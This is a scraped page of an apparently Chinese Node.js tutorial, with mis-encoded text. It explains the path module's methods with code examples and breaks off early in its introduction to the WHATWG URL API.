content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js å·¥å…·æ¨¡å—è¯¦è§£
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2084329779627965/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ¢¨å­åŒå¿—
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T09:34:36.000Z" title="Mon Dec 15 2025 09:34:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»12åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Node.js æä¾›äº†ä¸°å¯Œçš„å†…ç½®æ¨¡å—ï¼Œå¸®åŠ©å¼€å‘è€…é«˜æ•ˆå¤„ç†å„ç§å¸¸è§ä»»åŠ¡ã€‚æœ¬æ–‡å°†è¯¦ç»†ä»‹ç»äº”ä¸ªé‡è¦çš„å·¥å…·æ¨¡å—ï¼š<strong>path</strong>ï¼ˆè·¯å¾„å¤„ç†ï¼‰ã€<strong>url</strong>ï¼ˆURLè§£æï¼‰ã€<strong>querystring</strong>ï¼ˆæŸ¥è¯¢å­—ç¬¦ä¸²ï¼‰ã€<strong>util</strong>ï¼ˆå·¥å…·å‡½æ•°ï¼‰å’Œ <strong>os</strong>ï¼ˆæ“ä½œç³»ç»Ÿä¿¡æ¯ï¼‰ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€path æ¨¡å—ï¼šè·¯å¾„å¤„ç†</h2>
<p><code>path</code> æ¨¡å—æä¾›äº†ç”¨äºå¤„ç†å’Œè½¬æ¢æ–‡ä»¶è·¯å¾„çš„å®ç”¨å·¥å…·ã€‚å®ƒæœ€å¤§çš„ä¼˜åŠ¿æ˜¯<strong>è·¨å¹³å°å…¼å®¹æ€§</strong>ï¼Œèƒ½å¤Ÿè‡ªåŠ¨å¤„ç†ä¸åŒæ“ä½œç³»ç»Ÿçš„è·¯å¾„åˆ†éš”ç¬¦ï¼ˆWindows ä½¿ç”¨ <code>\</code>ï¼ŒUnix/Linux/macOS ä½¿ç”¨ <code>/</code>ï¼‰ã€‚</p>
<h3 data-id="heading-1">1.1 å¼•å…¥æ¨¡å—</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
</code></pre>
<h3 data-id="heading-2">1.2 å¸¸ç”¨æ–¹æ³•</h3>
<h4 data-id="heading-3"><code>path.join([...paths])</code> - è¿æ¥è·¯å¾„ç‰‡æ®µ</h4>
<p>å°†å¤šä¸ªè·¯å¾„ç‰‡æ®µè¿æ¥æˆä¸€ä¸ªå®Œæ•´çš„è·¯å¾„ï¼Œè‡ªåŠ¨å¤„ç†è·¯å¾„åˆ†éš”ç¬¦å’Œç›¸å¯¹è·¯å¾„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-comment">// åŸºæœ¬ç”¨æ³•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">join</span>(<span class="hljs-string">'/users'</span>, <span class="hljs-string">'john'</span>, <span class="hljs-string">'docs'</span>, <span class="hljs-string">'file.txt'</span>));
<span class="hljs-comment">// Unix/Linux/macOS: /users/john/docs/file.txt</span>
<span class="hljs-comment">// Windows: å¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç»å¯¹è·¯å¾„ï¼Œç»“æœå–å†³äºå¹³å°</span>

<span class="hljs-comment">// è·¨å¹³å°æ¨èç”¨æ³•ï¼ˆä½¿ç”¨ç›¸å¯¹è·¯å¾„ï¼‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">join</span>(<span class="hljs-string">'users'</span>, <span class="hljs-string">'john'</span>, <span class="hljs-string">'docs'</span>, <span class="hljs-string">'file.txt'</span>));
<span class="hljs-comment">// æ‰€æœ‰å¹³å°: users/john/docs/file.txtï¼ˆç›¸å¯¹è·¯å¾„ï¼‰</span>

<span class="hljs-comment">// ä½¿ç”¨ __dirname æ„å»ºç»å¯¹è·¯å¾„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">'docs'</span>, <span class="hljs-string">'file.txt'</span>));
<span class="hljs-comment">// è¾“å‡º: å½“å‰æ–‡ä»¶æ‰€åœ¨ç›®å½•/docs/file.txt</span>

<span class="hljs-comment">// å¤„ç†ç›¸å¯¹è·¯å¾„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">join</span>(<span class="hljs-string">'/foo'</span>, <span class="hljs-string">'bar'</span>, <span class="hljs-string">'baz/asdf'</span>, <span class="hljs-string">'quux'</span>, <span class="hljs-string">'..'</span>));
<span class="hljs-comment">// è¾“å‡º: /foo/bar/baz/asdf</span>

<span class="hljs-comment">// å¤„ç†å½“å‰ç›®å½•å’Œçˆ¶ç›®å½•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">'..'</span>, <span class="hljs-string">'config'</span>, <span class="hljs-string">'app.json'</span>));
<span class="hljs-comment">// è¾“å‡º: å½“å‰ç›®å½•çš„çˆ¶ç›®å½•ä¸‹çš„ config/app.json</span>
</code></pre>
<h4 data-id="heading-4"><code>path.resolve([...paths])</code> - è§£æä¸ºç»å¯¹è·¯å¾„</h4>
<p>å°†è·¯å¾„æˆ–è·¯å¾„ç‰‡æ®µè§£æä¸ºç»å¯¹è·¯å¾„ã€‚å¦‚æœæ‰€æœ‰è·¯å¾„ç‰‡æ®µéƒ½æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™ç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•è§£æã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-comment">// ä»å³åˆ°å·¦å¤„ç†è·¯å¾„ï¼Œç›´åˆ°æ„é€ å‡ºç»å¯¹è·¯å¾„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'foo/bar'</span>, <span class="hljs-string">'/tmp/file/'</span>, <span class="hljs-string">'..'</span>, <span class="hljs-string">'a/../subfile'</span>));
<span class="hljs-comment">// è¾“å‡º: /tmp/subfile</span>

<span class="hljs-comment">// å¦‚æœæ‰€æœ‰è·¯å¾„éƒ½æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™ç›¸å¯¹äºå½“å‰å·¥ä½œç›®å½•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">resolve</span>(<span class="hljs-string">'wwwroot'</span>, <span class="hljs-string">'static_files/png/'</span>, <span class="hljs-string">'../gif/image.gif'</span>));
<span class="hljs-comment">// å¦‚æœå½“å‰ç›®å½•æ˜¯ /home/myself/nodeï¼Œåˆ™è¾“å‡º:</span>
<span class="hljs-comment">// /home/myself/node/wwwroot/static_files/gif/image.gif</span>

<span class="hljs-comment">// å¸¸ç”¨ï¼šè§£æç›¸å¯¹äºå½“å‰æ–‡ä»¶çš„è·¯å¾„</span>
<span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'config.json'</span>);
</code></pre>
<h4 data-id="heading-5"><code>path.basename(path[, ext])</code> - è·å–æ–‡ä»¶å</h4>
<p>è¿”å›è·¯å¾„çš„æœ€åä¸€éƒ¨åˆ†ï¼ˆæ–‡ä»¶åï¼‰ã€‚å¯é€‰çš„ <code>ext</code> å‚æ•°ç”¨äºå»é™¤æ–‡ä»¶æ‰©å±•åã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">basename</span>(<span class="hljs-string">'/foo/bar/baz/asdf/quux.html'</span>));
<span class="hljs-comment">// è¾“å‡º: 'quux.html'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">basename</span>(<span class="hljs-string">'/foo/bar/baz/asdf/quux.html'</span>, <span class="hljs-string">'.html'</span>));
<span class="hljs-comment">// è¾“å‡º: 'quux'</span>

<span class="hljs-comment">// Windows ç¤ºä¾‹</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">basename</span>(<span class="hljs-string">'C:\\temp\\myfile.html'</span>));
<span class="hljs-comment">// è¾“å‡º: 'myfile.html'</span>
</code></pre>
<h4 data-id="heading-6"><code>path.dirname(path)</code> - è·å–ç›®å½•å</h4>
<p>è¿”å›è·¯å¾„çš„ç›®å½•éƒ¨åˆ†ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">dirname</span>(<span class="hljs-string">'/foo/bar/baz/asdf/quux.html'</span>));
<span class="hljs-comment">// è¾“å‡º: '/foo/bar/baz/asdf'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">dirname</span>(<span class="hljs-string">'/foo/bar/baz/asdf/quux'</span>));
<span class="hljs-comment">// è¾“å‡º: '/foo/bar/baz/asdf'</span>
</code></pre>
<h4 data-id="heading-7"><code>path.extname(path)</code> - è·å–æ‰©å±•å</h4>
<p>è¿”å›è·¯å¾„ä¸­æ–‡ä»¶çš„æ‰©å±•åï¼ˆåŒ…æ‹¬ç‚¹å·ï¼‰ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">'index.html'</span>));
<span class="hljs-comment">// è¾“å‡º: '.html'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">'index.coffee.md'</span>));
<span class="hljs-comment">// è¾“å‡º: '.md'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">'index.'</span>));
<span class="hljs-comment">// è¾“å‡º: '.'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">extname</span>(<span class="hljs-string">'index'</span>));
<span class="hljs-comment">// è¾“å‡º: ''</span>
</code></pre>
<h4 data-id="heading-8"><code>path.parse(path)</code> - è§£æè·¯å¾„å¯¹è±¡</h4>
<p>å°†è·¯å¾„å­—ç¬¦ä¸²è§£æä¸ºä¸€ä¸ªå¯¹è±¡ï¼ŒåŒ…å« <code>root</code>ã€<code>dir</code>ã€<code>base</code>ã€<code>ext</code>ã€<code>name</code> ç­‰å±æ€§ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-keyword">const</span> parsed = path.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'/home/user/dir/file.txt'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(parsed);
<span class="hljs-comment">// è¾“å‡º:</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   root: '/',</span>
<span class="hljs-comment">//   dir: '/home/user/dir',</span>
<span class="hljs-comment">//   base: 'file.txt',</span>
<span class="hljs-comment">//   ext: '.txt',</span>
<span class="hljs-comment">//   name: 'file'</span>
<span class="hljs-comment">// }</span>

<span class="hljs-comment">// Windows ç¤ºä¾‹</span>
<span class="hljs-keyword">const</span> winParsed = path.<span class="hljs-title function_">parse</span>(<span class="hljs-string">'C:\\path\\dir\\file.txt'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(winParsed);
<span class="hljs-comment">// è¾“å‡º:</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   root: 'C:\\',</span>
<span class="hljs-comment">//   dir: 'C:\\path\\dir',</span>
<span class="hljs-comment">//   base: 'file.txt',</span>
<span class="hljs-comment">//   ext: '.txt',</span>
<span class="hljs-comment">//   name: 'file'</span>
<span class="hljs-comment">// }</span>
</code></pre>
<h4 data-id="heading-9"><code>path.format(pathObject)</code> - æ ¼å¼åŒ–è·¯å¾„å¯¹è±¡</h4>
<p>ä¸ <code>path.parse()</code> ç›¸åï¼Œå°†è·¯å¾„å¯¹è±¡æ ¼å¼åŒ–ä¸ºè·¯å¾„å­—ç¬¦ä¸²ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-keyword">const</span> pathObject = {
  <span class="hljs-attr">root</span>: <span class="hljs-string">'/'</span>,
  <span class="hljs-attr">dir</span>: <span class="hljs-string">'/home/user/dir'</span>,
  <span class="hljs-attr">base</span>: <span class="hljs-string">'file.txt'</span>,
  <span class="hljs-attr">ext</span>: <span class="hljs-string">'.txt'</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">'file'</span>
};

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">format</span>(pathObject));
<span class="hljs-comment">// è¾“å‡º: '/home/user/dir/file.txt'</span>
</code></pre>
<h4 data-id="heading-10"><code>path.normalize(path)</code> - è§„èŒƒåŒ–è·¯å¾„</h4>
<p>è§„èŒƒåŒ–è·¯å¾„å­—ç¬¦ä¸²ï¼Œè§£æ <code>.</code> å’Œ <code>..</code> ç‰‡æ®µï¼Œå¹¶å¤„ç†å¤šä½™çš„è·¯å¾„åˆ†éš”ç¬¦ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">normalize</span>(<span class="hljs-string">'/foo/bar//baz/asdf/quux/..'</span>));
<span class="hljs-comment">// è¾“å‡º: '/foo/bar/baz/asdf'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">normalize</span>(<span class="hljs-string">'C:\\temp\\\\foo\\bar\\..\\'</span>));
<span class="hljs-comment">// Windows è¾“å‡º: 'C:\\temp\\foo\\'</span>
</code></pre>
<h4 data-id="heading-11"><code>path.isAbsolute(path)</code> - åˆ¤æ–­æ˜¯å¦ä¸ºç»å¯¹è·¯å¾„</h4>
<p>åˆ¤æ–­è·¯å¾„æ˜¯å¦ä¸ºç»å¯¹è·¯å¾„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">isAbsolute</span>(<span class="hljs-string">'/foo/bar'</span>)); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">isAbsolute</span>(<span class="hljs-string">'/baz/..'</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">isAbsolute</span>(<span class="hljs-string">'qux/'</span>));     <span class="hljs-comment">// false</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">isAbsolute</span>(<span class="hljs-string">'.'</span>));        <span class="hljs-comment">// false</span>

<span class="hljs-comment">// Windows</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">isAbsolute</span>(<span class="hljs-string">'C:\\foo'</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">isAbsolute</span>(<span class="hljs-string">'\\foo'</span>));    <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-12"><code>path.relative(from, to)</code> - è®¡ç®—ç›¸å¯¹è·¯å¾„</h4>
<p>è®¡ç®—ä» <code>from</code> åˆ° <code>to</code> çš„ç›¸å¯¹è·¯å¾„ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">relative</span>(<span class="hljs-string">'/data/orandea/test/aaa'</span>, <span class="hljs-string">'/data/orandea/impl/bbb'</span>));
<span class="hljs-comment">// è¾“å‡º: '../../impl/bbb'</span>

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(path.<span class="hljs-title function_">relative</span>(<span class="hljs-string">'C:\\orandea\\test\\aaa'</span>, <span class="hljs-string">'C:\\orandea\\impl\\bbb'</span>));
<span class="hljs-comment">// Windows è¾“å‡º: '..\\..\\impl\\bbb'</span>
</code></pre>
<h3 data-id="heading-13">1.3 ç‰¹æ®Šå˜é‡</h3>
<ul>
<li><strong><code>__dirname</code></strong>ï¼šå½“å‰æ¨¡å—çš„ç›®å½•åï¼ˆCommonJSï¼‰</li>
<li><strong><code>__filename</code></strong>ï¼šå½“å‰æ¨¡å—çš„æ–‡ä»¶åï¼ˆCommonJSï¼‰</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);

<span class="hljs-comment">// è·å–å½“å‰æ–‡ä»¶çš„ç›®å½•</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(__dirname);
<span class="hljs-comment">// è¾“å‡º: /path/to/current/directory</span>

<span class="hljs-comment">// è·å–å½“å‰æ–‡ä»¶çš„å®Œæ•´è·¯å¾„</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(__filename);
<span class="hljs-comment">// è¾“å‡º: /path/to/current/directory/file.js</span>

<span class="hljs-comment">// æ„å»ºç›¸å¯¹äºå½“å‰æ–‡ä»¶çš„è·¯å¾„</span>
<span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">'config'</span>, <span class="hljs-string">'app.json'</span>);
</code></pre>
<h3 data-id="heading-14">1.4 å®ç”¨ç¤ºä¾‹</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> path = <span class="hljs-built_in">require</span>(<span class="hljs-string">'path'</span>);
<span class="hljs-keyword">const</span> fs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'fs'</span>).<span class="hljs-property">promises</span>;

<span class="hljs-comment">// ç¤ºä¾‹1ï¼šå®‰å…¨åœ°æ„å»ºæ–‡ä»¶è·¯å¾„</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">readConfig</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> configPath = path.<span class="hljs-title function_">join</span>(__dirname, <span class="hljs-string">'config'</span>, <span class="hljs-string">'app.json'</span>);
  <span class="hljs-keyword">const</span> data = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(configPath, <span class="hljs-string">'utf8'</span>);
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(data);
}

<span class="hljs-comment">// ç¤ºä¾‹2ï¼šè·å–æ–‡ä»¶ä¿¡æ¯</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">getFileInfo</span>(<span class="hljs-params">filePath</span>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">fullPath</span>: path.<span class="hljs-title function_">resolve</span>(filePath),
    <span class="hljs-attr">dirname</span>: path.<span class="hljs-title function_">dirname</span>(filePath),
    <span class="hljs-attr">basename</span>: path.<span class="hljs-title function_">basename</span>(filePath),
    <span class="hljs-attr">extname</span>: path.<span class="hljs-title function_">extname</span>(filePath),
    <span class="hljs-attr">name</span>: path.<span class="hljs-title function_">basename</span>(filePath, path.<span class="hljs-title function_">extname</span>(filePath))
  };
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">getFileInfo</span>(<span class="hljs-string">'/home/user/docs/report.pdf'</span>));
<span class="hljs-comment">// è¾“å‡º:</span>
<span class="hljs-comment">// {</span>
<span class="hljs-comment">//   fullPath: '/home/user/docs/report.pdf',</span>
<span class="hljs-comment">//   dirname: '/home/user/docs',</span>
<span class="hljs-comment">//   basename: 'report.pdf',</span>
<span class="hljs-comment">//   extname: '.pdf',</span>
<span class="hljs-comment">//   name: 'report'</span>
<span class="hljs-comment">// }</span>

<span class="hljs-comment">// ç¤ºä¾‹3ï¼šå¤„ç†ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">isImageFile</span>(<span class="hljs-params">filename</span>) {
  <span class="hljs-keyword">const</span> ext = path.<span class="hljs-title function_">extname</span>(filename).<span class="hljs-title function_">toLowerCase</span>();
  <span class="hljs-keyword">return</span> [<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.jpeg'</span>, <span class="hljs-string">'.png'</span>, <span class="hljs-string">'.gif'</span>, <span class="hljs-string">'.webp'</span>].<span class="hljs-title function_">includes</span>(ext);
}

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isImageFile</span>(<span class="hljs-string">'photo.jpg'</span>));  <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">isImageFile</span>(<span class="hljs-string">'document.pdf'</span>)); <span class="hljs-comment">// false</span>
</code></pre>
<hr/>
<h2 data-id="heading-15">äºŒã€url æ¨¡å—ï¼šURL è§£æ</h2>
<p><code>url</code> æ¨¡å—æä¾›äº†ç”¨äºè§£æå’Œæ ¼å¼åŒ– URL çš„å®ç”¨å·¥å…·ã€‚Node.js æ¨èä½¿ç”¨ <strong>WHATWG URL API</strong>ã€‚</p>
<h3 data-id="heading-16">2.1 å¼•å…¥æ¨¡å—</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// WHATWG URL APIï¼ˆæ¨èï¼‰</span>
<span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">URL</span>, <span class="hljs-title class_">URLSearchParams</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);
</code></pre>
<h3 data-id="heading-17">2.2 WHATWG URL APIï¼ˆæ¨èï¼‰</h3>
<h4 data-id="heading-18"><code>new URL(input[, base])</code> - åˆ›å»º URL å¯¹è±¡</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> { <span class="hljs-variable constant_">URL</span> } = <span class="hljs-built_in">require</span>(<span class="hljs-string">'url'</span>);

<span class="hljs-comment">// ç»å¯¹ URL</span>
<span class="hljs-keyword">const</span> myURL = <span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'https://example.org:8080/p/a/t/h?query=string#hash'</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">href</span>);        <span class="hljs-comment">// 'https://example.org:8080/p/a/t/h?query=string#hash'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">protocol</span>);    <span class="hljs-comment">// 'https:'</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(myURL.<span class="hljs-property">hostname</span>);    <span class="hljs-comment">// 'example.org'</span>
